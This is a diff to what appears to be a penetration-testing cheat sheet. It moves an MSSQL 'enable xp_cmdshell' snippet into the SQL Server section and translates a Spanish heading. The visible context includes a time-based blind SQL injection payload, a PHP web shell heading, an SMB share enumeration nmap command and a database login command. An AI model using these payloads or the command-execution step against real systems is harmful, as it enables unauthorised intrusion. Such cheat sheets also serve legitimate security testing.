@@ -337,10 +337,6 @@ MSSQL
 ```
 IF EXISTS (SELECT 1 FROM dbo.users WITH(NOLOCK) WHERE username like 'a%') WAITFOR DELAY '0:0:5'-- --
 ```
-Enable xp_cmdshell
-```
-SP_CONFIGURE "xp_cmdshell", 1
-```
 
 ### PHP Web Shell
 ```
@@ -769,9 +765,13 @@ nmap -p445 --script smb-enum-shares IP
 ```
 ## MSSQL (Microsoft SQL Server)
 
-Conectarse la BBDD con SQSH
+Connect to the DB with SQSH
 ```
 sqsh -S <IP> -U <Username> -P <Password> -D <Database>
+```
+Enable xp_cmdshell
+```
+SP_CONFIGURE "xp_cmdshell", 1
 ```
 Comandos útiles 
 
